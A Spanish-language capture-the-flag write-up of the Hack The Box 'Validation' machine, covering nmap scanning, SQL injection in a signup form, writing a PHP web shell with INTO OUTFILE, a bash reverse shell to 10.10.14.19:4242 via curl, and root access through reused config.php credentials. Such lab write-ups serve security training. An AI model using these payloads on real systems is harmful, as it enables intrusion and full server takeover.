
#  VALIDATION MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/1.png)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]
	- [[#NOTA|NOTA]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.11.116 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.11.116 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/3.png)

## EXPLOTACION

veamos la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/4.png)

vemos que permite agregar participantes segun un pais:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/5.png)

creamos otro y vemos como se mantienen los participantes:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/6.png)

vamos a verlo desde burp suite:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/7.png)

vemos que devuelve una cokie llamada user, vamos a ver si podemos descifrarlo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/8.png)

usa md5:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/9.png)

la cookie esta almacenando el nombre de usuario en md5, una mala practica.

Vamos a probar un SQLi en el pais al registrar y despues consultamos (refrscamos) la pagina donde muestra los participantes pero con la cookie que se genero:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/10.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/11.png)

vemos que es vulerable a SQLi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/12.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/13.png)

algo que podemos probar es si tiene permisos para crear un archivo en una ruta especifica:

```bash
select "hola mundo" into outfile '/var/www/html/test.txt'
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/14.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/15.png)

vemos que pudo escribir, esto se debe a que debe tener el privilegio **FILE** asignado, comprobemoslo.

primero obtendremos el usuario:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/16.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/17.png)

ahora consultaremos sus permisos:

```bash
select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/18.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/19.png)

vemos que tiene el permiso **FILE** asignado.

ademas vemos que la pagina interpreta PHP:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/20.png)

vamos a crear una pagna que pida por GET un parametro y lo ejecute a nivel de sistema:

```php
<?php system($_REQUEST['cmd']); ?>
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/21.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/22.png)

ahora consultamos desde el navegador pero mandamos el parametro por GET "cmd" y le pasmos el comando que queremos ejecutar

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/23.png)

ahora nos mandamos una reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.19/4242 0>&1'
```

pero a la hora de mandar algo con espacios es recomendable hacerlo mediante **urlencoded** asi que lo podemos hacer de dos maneras, con la ayuda del decoder de burpsuite dandole a encode as URL y pasando el resultado al parametro cmd:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/24.png)

o con curl:

```bash
curl 10.10.11.116/cmd.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.19/4242 0>&1"'
```

ambos son validos y daran como resultado una reverse shell:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/25.png)

podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/26.png)

## ELEVACION DE PRIVILEGIOS

hacemos un tratamiento de la tty:

```bash
script /dev/null -c bash
[ctrl + Z]
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 53 columns 187
```

nos encontramos en el directorio **/var/www/html** y vemos un archivo llamado config.php, estos suelen contener informacion de conexiones y API keys:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/27.png)

vemos unas credenciales de base de datos pero el puerto no esta abierto y tampoco lo esta local, pero no perdemos nada intenta usar para el usuario root ya que es un linux:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/28.png)

somos root y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/VALIDATION/images/29.png)

### NOTA

si se tiene un SQLi verificar si puede escribir archivos:

```bash
select "hola mundo" into outfile '/var/www/html/test.txt'
```

si necesitas mandar un parametro por GET con espacios es mejor hacer un urlencode.

para tener mayor funcionalidad es recomendable hacer un tratamiento de la TTY.
